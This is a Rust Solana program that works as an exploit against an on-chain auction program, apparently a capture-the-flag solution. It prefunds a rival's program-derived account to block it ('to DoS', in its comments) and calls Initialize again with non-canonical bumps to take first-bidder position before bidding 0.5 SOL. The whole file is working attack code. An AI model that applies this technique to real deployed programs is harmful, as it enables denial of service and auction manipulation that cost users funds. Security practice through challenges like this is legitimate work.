use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint::ProgramResult,
    program::{invoke, invoke_signed},
    program_error::ProgramError,
    pubkey::Pubkey,
    rent::Rent,
    system_instruction,
    declare_id,
};

use solana_program::{
  instruction::{
    AccountMeta,
    Instruction,
  },
  system_program,
};

use borsh::{BorshDeserialize, BorshSerialize, to_vec};

#[derive(BorshSerialize, BorshDeserialize)]
pub enum AuctionInstruction {
    Initialize { config_bump: u8, vault_bump: u8, winner_bump: u8},
    InitializeBidder { },
    Bid { vault_bump: u8, winner_bump: u8, amount: u64},
}
#[repr(C)]
#[derive(BorshSerialize, BorshDeserialize)]
pub struct Payload {
    pub config_bump: u8,
    pub vault_bump: u8,
    pub winner_bump: u8,
    pub winner_non_canonical: u8
}

pub fn process_instruction(program: &Pubkey, accounts: &[AccountInfo], mut data: &[u8]) -> ProgramResult {
    let account_iter = &mut accounts.iter();
    let prog = next_account_info(account_iter)?;
    let user = next_account_info(account_iter)?;
    let noobmaster_pda = next_account_info(account_iter)?;
    let user_config = next_account_info(account_iter)?;
    let config = next_account_info(account_iter)?;
    let vault = next_account_info(account_iter)?;
    let winner = next_account_info(account_iter)?;
    let winner_non_canonical = next_account_info(account_iter)?;
    let bumps = Payload::try_from_slice(data).unwrap();
    // Prefund NoobMaster PDA to DoS
    invoke(
        &system_instruction::transfer(
            &user.key,
            &noobmaster_pda.key,
            Rent::minimum_balance(&Rent::default(), 256),
            ),
        &[user.clone(),noobmaster_pda.clone()]
        )?;
    invoke(
    // Call Initialize again with non-canonical bumps (this allows for a new PDA to be created). This makes you the first bidder
        &Instruction {
        program_id: *prog.key,
        accounts: vec![
        AccountMeta::new(*vault.key, false),
        AccountMeta::new(*user.key, true),
        AccountMeta::new(*config.key, false),
        AccountMeta::new(*winner_non_canonical.key, false),
        AccountMeta::new_readonly(system_program::id(), false),
        ],
         data: to_vec(&AuctionInstruction::Initialize { config_bump: bumps.config_bump, vault_bump: bumps.vault_bump, winner_bump: bumps.winner_non_canonical }).unwrap(),
    },
    &[vault.clone(), user.clone(), config.clone(),winner_non_canonical.clone()]
    )?;
    // Initialize ourselves
    invoke(
        &Instruction {
        program_id: *prog.key,
        accounts: vec![
        AccountMeta::new(*user.key, true),
        AccountMeta::new(*user_config.key, false),
        AccountMeta::new_readonly(system_program::id(), false),
        ],
         data: to_vec(&AuctionInstruction::InitializeBidder {  }).unwrap(),
    },
    &[user.clone(), user_config.clone()]
    )?;
    // Bid 0.5 SOL (500,000,000 lamports)
    invoke(
        &Instruction {
        program_id: *prog.key,
        accounts: vec![
        AccountMeta::new(*user.key, true),
        AccountMeta::new(*user_config.key, false),
        AccountMeta::new(*config.key, false),
        AccountMeta::new(*vault.key, false),
        AccountMeta::new(*winner.key, false),
        AccountMeta::new_readonly(system_program::id(), false),
        ],
         data: to_vec(&AuctionInstruction::Bid { vault_bump: bumps.vault_bump, winner_bump: bumps.winner_bump, amount: 500_000_000 }).unwrap(),
    },
    &[user.clone(), user_config.clone(), config.clone(), vault.clone(),winner.clone()]
    )?;

    Ok(())
    

}